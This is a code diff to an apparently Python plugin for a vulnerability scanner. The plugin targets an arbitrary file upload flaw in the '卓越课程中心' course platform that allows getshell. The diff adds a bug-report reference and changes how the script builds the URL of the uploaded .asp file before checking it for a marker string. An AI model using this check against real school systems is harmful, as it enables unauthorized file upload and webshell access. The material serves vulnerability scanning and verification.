@@ -13,7 +13,7 @@ class Vuln(ABVuln):
     desc = '''
         卓越课程中心 /G2S/AdminSpace/PublicClass/AddVideoCourseWare.ashx?action=UploadImage 可上传任意文件，getshell，影响众多学校。
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=099059'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = '卓越课程中心'  # 漏洞应用名称
@@ -85,7 +85,7 @@ Submit Query
             code, head, res, errcode, _ = hh.http(url, raw=raw)
             if '.asp' not in res or '<' in res:
                 return
-            url = arg + '/download/' + res
+            url = self.target + '/download/' + res
             code, head, res, errcode, _ = hh.http(url)
             if code == 200 and 'zddfggsfagsdfhdfjskjhsdfkfk' in res:
                 # security_hole(url)
